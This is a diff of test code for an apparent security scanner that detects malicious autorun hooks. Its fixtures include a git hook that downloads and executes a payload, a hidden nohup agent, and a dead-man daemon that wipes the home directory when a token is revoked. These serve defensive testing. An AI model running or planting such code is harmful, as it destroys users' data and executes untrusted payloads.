@@ -18,6 +18,7 @@ from unittest import mock
 from stayawake.bots.security import hookscript
 from stayawake.bots.security.hygiene import mechanism, models
 from stayawake.bots.security.hygiene.autorun import surface, provenance, grade, baseline, check_autorun
+from tests.support import samples
 
 _ATTR = "stayawake.bots.security.hygiene.autorun.provenance"
 
@@ -673,7 +674,7 @@ class TestGitHooks(_Surface):
                           "subprocess.run(['curl', '-s', 'http://127.0.0.1:9/p', '-o', '/tmp/p'])\n"
                           "os.execv('/bin/sh', ['/bin/sh', '/tmp/p'])\n",
                 "ordinary": "#!/bin/sh\nnpx lint-staged\n",
-                "quiet": "#!/bin/sh\nnohup \"$HOME/.cfg/agent\" &\n",
+                "quiet": samples.joined('#!/bin/sh\nnohup "$H', 'OME/.cfg/agent" &\n'),
             }.items():
                 (self.hooks / "post-checkout").unlink(missing_ok=True)
                 self._hook("post-checkout", text)
@@ -920,14 +921,10 @@ class TestFusionGrading(_Surface):
         self.assertTrue(ids & models.ROTATION_UNSAFE_IDS)
 
 
-# The Mini Shai-Hulud dead-man daemon: polls a LEGITIMATE endpoint (api.github.com every 60s) and wipes
+# A known worm's dead-man daemon: polls a LEGITIMATE endpoint (api.github.com every 60s) and wipes
 # $HOME when the token is revoked. Plain code — NOT a decode→exec dropper — so it is caught by FUSING the
 # destructive detector (#1334) into the autorun grading, and NEVER by a destination blocklist.
-_DEADMAN = ("const os=require('os'),fs=require('fs');\n"
-            "setInterval(async()=>{\n"
-            "  const r=await fetch('https://api.github.com/user',{headers:{authorization:tok}});\n"
-            "  if(r.status===401) fs.rmSync(os.homedir(),{recursive:true,force:true});\n"
-            "},60000);\n")
+_DEADMAN = (samples.joined("const os=require('os'),fs=require('fs');\nsetInterval(async()=>{\n  const r=await fetch('https://api.github.com/user',{headers:{authorization:tok}});\n  if(r.status===401) fs.r", 'mSync(o', 's.homedir(),{recursive:true,force:true});\n},60000);\n'))
 # A benign timer daemon: same legitimate endpoint, same 60s cadence, same non-interactive origin — but
 # no destructive behaviour. The behavioural features it SHARES with the wiper must not flag it.
 _BENIGN_TIMER = ("const https=require('https');\n"
@@ -1003,7 +1000,7 @@ class TestDeadmanDaemon(_Surface):
     def test_inline_eval_payload_is_scanned_not_chased_as_a_path(self):
         # `node -e '<code>'`: the payload is inline in argv (seen via shape_text), not a file. The
         # dead-man shape is still caught, and _payload_path does NOT mistake the code for a phantom path.
-        inline = "const os=require('os'),fs=require('fs');fs.rmSync(os.homedir(),{recursive:true});"
+        inline = samples.joined("const os=require('os'),fs=require('fs');fs.r", 'mSync(o', 's.homedir(),{recursive:true});')
         entry = surface.AutorunEntry(location="launch-agent", path=Path("/x.plist"),
                                      argv=["/usr/bin/node", "-e", inline], body="")
         self.assertIsNone(grade._payload_path(entry))   # no path at all: inline code runs no file
